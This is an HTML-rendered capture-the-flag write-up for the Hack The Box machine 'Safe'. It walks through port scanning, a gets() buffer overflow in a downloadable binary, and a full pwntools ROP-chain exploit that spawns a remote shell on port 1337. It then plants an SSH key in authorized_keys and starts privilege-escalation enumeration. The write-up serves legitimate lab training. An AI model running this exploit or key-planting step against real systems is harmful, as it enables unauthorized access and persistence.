I"Jn<h1 id="htb-safe-101010147"><span style="color:red">HTB Safe (10.10.10.147)</span></h1>

<hr />

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 15000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.147
<span class="go">
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  1337/tcp open  waste

</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,1337 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 10.10.10.147
<span class="go">
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
  |   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
  |_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
  80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
  |_http-server-header: Apache/2.4.25 (Debian)
  |_http-title: Apache2 Debian Default Page: It works
  1337/tcp open  waste?
  | fingerprint-strings: 
  |   DNSStatusRequestTCP: 
  |     09:11:19 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |   DNSVersionBindReqTCP: 
  |     09:11:13 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |   GenericLines: 
  |     09:10:59 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |     What do you want me to echo back?
  |   GetRequest: 
  |     09:11:05 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |     What do you want me to echo back? GET / HTTP/1.0
  |   HTTPOptions: 
  |     09:11:06 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |     What do you want me to echo back? OPTIONS / HTTP/1.0
  |   Help: 
  |     09:11:24 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back? HELP
  |   NULL: 
  |     09:10:59 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |   RPCCheck: 
  |     09:11:08 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |   RTSPRequest: 
  |     09:11:07 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back? OPTIONS / RTSP/1.0
  |   SSLSessionReq: 
  |     09:11:25 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back?
  |   TLSSessionReq: 
  |     09:11:27 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back?
  |   TerminalServerCookie: 
  |     09:11:26 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |_    What do you want me to echo back?

</span></code></pre></div></div>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="tcp-port-80">TCP PORT 80</h3>

<p>Opening <strong><code class="highlighter-rouge">http://10.10.10.147</code></strong> brings you to a default web server page:</p>

<p><img src="./screenshots/33_safe/80_landing_page.png" alt="80 Landing Page" /></p>

<p>And viewing its page source reveals an HTML comment:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span>
<span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="nt">&gt;</span>
<span class="c">&lt;!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 --&gt;</span>
...omitted...
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>It says that an application, <a href="">myapp</a>, is running on port 1337 and could be downloaded via HTTP.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>wget http://10.10.10.147/myapp
<span class="go">
  Connecting to 10.10.10.147:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 16592 (16K)
  Saving to: ‘myapp’

</span><span class="gp">  myapp                     100%[=====================================&gt;</span><span class="o">]</span>  16.20K
<span class="go">
</span></code></pre></div></div>

<h3 id="tcp-port-1337">TCP PORT 1337</h3>

<p>The downloaded application was said to be hosted on this port and trying to access it over <span>netcat</span> goes like the following:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nc 10.10.10.147 1337
<span class="go">
   09:30:08 up 19:50,  0 users,  load average: 0.02, 0.01, 0.00
  test_input_string

  What do you want me to echo back? test_input_string

</span></code></pre></div></div>

<p>The same goes when trying to execute the downloaded application from earlier.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">chmod</span> +x myapp
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>./myapp
<span class="go">
   21:32:30 up 59 min,  1 user,  load average: 3.47, 3.49, 3.48

  What do you want me to echo back? test_input_string_for_myapp_local
  test_input_string_for_myapp_local

</span></code></pre></div></div>

<p>With a local copy of the binary, it should be easier to create an exploit to achieve remote command execution.</p>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<h3 id="myapp">./myapp</h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>file ./myapp
<span class="go">
  ./myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
  interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5
  450d23673e92c8b716200762ca7d282c73a, not stripped

</span><span class="gp">$</span><span class="w"> </span>gdb <span class="nt">-q</span> ./myapp
<span class="go">
(gdb) checksec

  Canary                        : No
  NX                            : Yes
  PIE                           : No
  Fortify                       : No
  RelRO                         : Partial

</span></code></pre></div></div>

<p><strong><code class="highlighter-rouge">./myapp</code></strong> is a <strong style="color:orange">64-bit ELF executable</strong> which means that crafting ROP chains with function arguments requries setting certain register values before passing each function call. Its security features include only <strong><em>NX (non-executable segment)</em></strong> enabled and <strong><em>Partial RelRO (Relocation Read-Only)</em></strong>.</p>

<p><strong style="color:orange">NX (Non-execute)</strong></p>
<blockquote>
  <p>The application, when loaded in memory, does not allow any of its segments to be both writable and executable. The idea here is that writable memory should never be executed (as it can be manipulated) and vice versa.</p>
</blockquote>

<p><strong style="color:orange">Partial RelRO (Relocation Read-Only)</strong></p>
<blockquote>
  <p>The headers in your binary, which need to be writable during startup of the application (to allow the dynamic linker to load and link stuff like shared libraries) are marked as read-only when the linker is done doing its magic (but before the application itself is launched).</p>
</blockquote>

<h3 id="the-main-function">the <strong>main()</strong> function</h3>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disassemble main

  0x000000000040115f &lt;+0&gt;:	push   rbp
  0x0000000000401160 &lt;+1&gt;:	mov    rbp,rsp
  0x0000000000401163 &lt;+4&gt;:	sub    rsp,0x70
  0x0000000000401167 &lt;+8&gt;:	lea    rdi,[rip+0xe9a]        <span class="c"># 0x402008</span>
  0x000000000040116e &lt;+15&gt;:	call   0x401040 &lt;system@plt&gt;
  0x0000000000401173 &lt;+20&gt;:	lea    rdi,[rip+0xe9e]        <span class="c"># 0x402018</span>
  0x000000000040117a &lt;+27&gt;:	mov    eax,0x0
  0x000000000040117f &lt;+32&gt;:	call   0x401050 &lt;<span class="nb">printf</span>@plt&gt;
  0x0000000000401184 &lt;+37&gt;:	lea    rax,[rbp-0x70]
  0x0000000000401188 &lt;+41&gt;:	mov    esi,0x3e8
  0x000000000040118d &lt;+46&gt;:	mov    rdi,rax
  0x0000000000401190 &lt;+49&gt;:	mov    eax,0x0
  0x0000000000401195 &lt;+54&gt;:	call   0x401060 &lt;gets@plt&gt;
  0x000000000040119a &lt;+59&gt;:	lea    rax,[rbp-0x70]
  0x000000000040119e &lt;+63&gt;:	mov    rdi,rax
  0x00000000004011a1 &lt;+66&gt;:	call   0x401030 &lt;puts@plt&gt;
  0x00000000004011a6 &lt;+71&gt;:	mov    eax,0x0
  0x00000000004011ab &lt;+76&gt;:	leave  
  0x00000000004011ac &lt;+77&gt;:	ret  
 
</code></pre></div></div>

<p>Since there is already a call to the <strong style="color:orange">libc system function</strong> (<strong><code class="highlighter-rouge">system@plt</code></strong>) and a way to write to memory using the existing call to <strong><code class="highlighter-rouge">gets()</code></strong> (<strong><code class="highlighter-rouge">gets@plt</code></strong>), there is no need to leak libc addresses to compute offsets beacuse we already have what we need aside from having control of the <strong style="color:orange">$rdi</strong> register.</p>

<p>In creating 64-bit ROP chains, the value of the <strong style="color:orange">$rdi</strong> register can be used to pass a first argument to a function (followed by <strong style="color:orange">$rsi</strong>, <strong style="color:orange">$rdx</strong>, <strong style="color:orange">$rcx</strong>, <strong style="color:orange">$r8</strong>, then <strong style="color:orange">$r9</strong>). To summarize the code snippet (<strong><code class="highlighter-rouge">&lt;+37&gt;</code></strong> to <strong><code class="highlighter-rouge">&lt;+54&gt;</code></strong>) above, the address <strong><code class="highlighter-rouge">[rbp-0x70]</code></strong> is saved to <strong><code class="highlighter-rouge">$rax</code></strong> which is then moved to <strong><code class="highlighter-rouge">$rdi</code></strong>. <strong><code class="highlighter-rouge">[rbp-0x70]</code></strong> is now the effective address where the function call <strong><code class="highlighter-rouge">gets@plt</code></strong> will save the input from STDIN.</p>

<h3 id="exploitpy-finding-the-right-offset">exploit.py (finding the right offset)</h3>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x70"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"C"</span> <span class="o">*</span> <span class="mi">8</span>                      <span class="c1"># RETURN ADDRESS PLACEHOLDER
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span> 0x00000000004011ac  <span class="c"># main() function's return call</span>

  Breakpoint 1 at 0x4011ac

<span class="o">(</span>gdb<span class="o">)</span> run <span class="o">&lt;&lt;&lt;</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "A"*int("0x70",16) + "B"*8 + "C"*8'</span><span class="si">)</span>

<span class="o">(</span>gdb<span class="o">)</span> x/i <span class="nv">$rip</span>

  <span class="o">=&gt;</span> 0x4011ac &lt;main+77&gt;:	ret

<span class="o">(</span>gdb<span class="o">)</span> x/xw <span class="nv">$rsp</span>

  0x7fffffffe088:  0x4343434343434343

</code></pre></div></div>

<p>The user input for gets is saved at <strong><code class="highlighter-rouge">[rbp-0x70]</code></strong>. Since the return address is, in this case, 8 bytes away from the base pointer, writing 8 bytes beyond <strong><code class="highlighter-rouge">[rbp-0x80]</code></strong> would overwrite the value of <strong><code class="highlighter-rouge">$rbp</code></strong> and another 8 bytes would overwrite the return address.</p>

<p>At the current instruction, <strong><code class="highlighter-rouge">ret</code></strong>, the return address referenced by the stack pointer is now overwritten to be <strong><code class="highlighter-rouge">4343434343434343</code></strong> or <strong><code class="highlighter-rouge">CCCCCCCC</code></strong>.</p>

<h3 id="exploitpy-writing-binsh-to-memory">exploit.py (writing “/bin/sh” to memory)</h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ROPgadget <span class="nt">--binary</span> ./myapp | <span class="nb">grep</span> <span class="s2">"pop rdi"</span>
<span class="go">
</span><span class="gp">  0x000000000040120b : pop rdi ;</span><span class="w"> </span>ret
<span class="go">
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info files

  ...omitted...
  0x0000000000404048 - 0x0000000000404050 is .bss
  ...omitted...

<span class="o">(</span>gdb<span class="o">)</span> x/2xg 0x0000000000404048

  0x404048 &lt;completed.7325&gt;:	0x0000000000000000	0x0000000000000000

</code></pre></div></div>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwnable</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./myapp"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x70"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40120b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404048</span><span class="p">)</span>                <span class="c1"># $rdi (.bss segment) 
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401060</span><span class="p">)</span>                <span class="c1"># ret (gets@plt)
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40115f</span><span class="p">)</span>                <span class="c1"># main &lt;+0&gt;
</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">shell</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shell</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span><span class="o">%</span><span class="mi">8</span><span class="p">)))</span>
</code></pre></div></div>

<p>The string <strong><code class="highlighter-rouge">/bin/sh\x00</code></strong> is written to the <strong style="color:orange">.bss section</strong> since the payload constructed above simulates <strong><code class="highlighter-rouge">gets(.bss)</code></strong> then returns back to <strong><code class="highlighter-rouge">main()</code></strong> in order to make use of the written value. It is essential to return to <strong><code class="highlighter-rouge">main()</code></strong> since, otherwise, once the program terminates, the stored “/bin/sh” string will no longer be accessible.</p>

<p><strong style="color:orange">.bss section</strong> (<a href="https://en.wikipedia.org/wiki/.bss">according to Wikipedia</a>)</p>
<blockquote>
  <p>It used by many compilers and linkers for the portion of an object file or executable containing statically-allocated variables that are not explicitly initialized to any value. It is often referred to as the “bss section” or “bss segment”.</p>

  <p>Typically only the length of the bss section, but no data, is stored in the object file. The program loader allocates memory for the bss section when it loads the program. On some platforms, some or all of the bss section is initialized to zeroes. Unix-like systems and Windows initialize the bss section to zero, allowing C and C++ statically-allocated variables initialized to values represented with all bits zero to be put in the bss segment. Operating systems may use a technique called zero-fill-on-demand to efficiently implement the bss segment.</p>
</blockquote>

<h3 id="exploitpy-call-systemplt">exploit.py (call system@plt)</h3>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x70"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40120b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404048</span><span class="p">)</span>                <span class="c1"># $rdi (.bss segment) 
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401060</span><span class="p">)</span>                <span class="c1"># ret (system@plt)
</span></code></pre></div></div>

<p>After returning back to the <strong><code class="highlighter-rouge">main()</code></strong> function, create a payload that recreates the function call, <strong><code class="highlighter-rouge">system("/bin/sh")</code></strong>.</p>

<h3 id="exploitpy-putting-everything-together">exploit.py (putting everything together)</h3>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwnable</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

<span class="n">pwnable</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x70"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40120b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404048</span><span class="p">)</span>                <span class="c1"># rdi | .bss segment 
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401060</span><span class="p">)</span>                <span class="c1"># ret | gets@plt
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40115f</span><span class="p">)</span>                <span class="c1"># main &lt;+0&gt;
</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">shell</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shell</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span><span class="o">%</span><span class="mi">8</span><span class="p">)))</span>

<span class="n">pwnable</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="s">"0x70"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>	<span class="c1"># OFFSET
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>			<span class="c1"># BASE POINTER
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40120b</span><span class="p">)</span>                <span class="c1"># pop rdi; ret;
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404048</span><span class="p">)</span>                <span class="c1"># rdi | .bss segment
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401040</span><span class="p">)</span>                <span class="c1"># ret | system@plt
</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">pwnable</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="exploitpy-running-the-exploit">exploit.py (running the exploit)</h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python exploit.py
<span class="go">
  [+] Opening connection to 10.10.10.147 on port 1337: Done
  [*] Switching to interactive mode

</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">
  uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | egrep <span class="nt">-e</span> <span class="s2">"*sh$"</span>
<span class="go">
  root:x:0:0:root:/root:/bin/bash
  user:x:1000:1000:user,,,:/home/user:/bin/bash

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/user/user.txt
<span class="go">
  7a29........................7690

</span></code></pre></div></div>

<hr />

<h2 id="part-4--generate-user-shell-user">PART 4 : GENERATE USER SHELL (user)</h2>

<p>While inside the <strong><code class="highlighter-rouge">exploit.py</code></strong> shell, upload an <strong>ssh public key</strong>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">mkdir</span> .ssh
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7q7Tojx6CL6s/GpGhI83xOzVnio8uQEkB28KhQdAf2q/yMofCRisKXJ9Y9gvk2i+GyMn8KJLqGLhu/xLf8g8WXMNfGD7gKwL7SYGOE9pTSWzZq/4EKllE51+Z6GNn/5rp5YJtPKhdkE1C3vp0IBMMw6W6CXqnnbDTKIIe8UY93vwdhvbKKH4mo9Hv1TkbzWbnGGYYyr31wuH1ZW9QUqNjiSWkateNGj+UURgt3YvtdPQmcdNudjiKxQlxaXrkyaZDMZIA9CCxIXUBn/n0/ARD2rjdUDxPFeKheKJcszk6rFNb+4hr5DHFpPPuLG0MGp5qzbnSQbwpveNIk29ECeCxyVy3S8fcZLICTz73NFoXB5zNHjaQlIAk82YGn0F5nmH/rSvcYrFcM55NFL8Fp4qW6piDRhTatVV6/7CJzbcZ5w54dn1iloOc18cyu04COe8456FdXQRqayGuLR1IoFXR/t47pLHai3gFkLESP1PFebnjJGCvz4r7Bl8t3TnLG4k= root@kali"</span> <span class="o">&gt;&gt;</span> /home/user/.ssh/authorized_keys
</code></pre></div></div>

<p>Once this is done, connect via <strong><code class="highlighter-rouge">ssh</code></strong> as user, <strong><code class="highlighter-rouge">user</code></strong>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa <span class="nt">-l</span> user 10.10.10.147
<span class="go">
</span><span class="gp">user@safe:~$</span><span class="w">
</span></code></pre></div></div>

<hr />

<h2 id="part-5--privilege-escalation-user---root">PART 5 : PRIVILEGE ESCALATION (user -&gt; root)</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@safe:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lh</span>
<span class="go">
  -rw-r--r-- 1 user user 1907614 May 13 11:15 IMG_0545.JPG
  -rw-r--r-- 1 user user 1916770 May 13 11:15 IMG_0546.JPG
  -rw-r--r-- 1 user user 2529361 May 13 11:15 IMG_0547.JPG
  -rw-r--r-- 1 user user 2926644 May 13 11:15 IMG_0548.JPG
  -rw-r--r-- 1 user user 1125421 May 13 11:15 IMG_0552.JPG
  -rw-r--r-- 1 user user 1085878 May 13 11:15 IMG_0553.JPG
  -rwxr-xr-x 1 user user   16592 May 13 08:47 myapp
  -rw-r--r-- 1 user user    2446 May 13 11:15 MyPasswords.kdbx

</span></code></pre></div></div>

:ET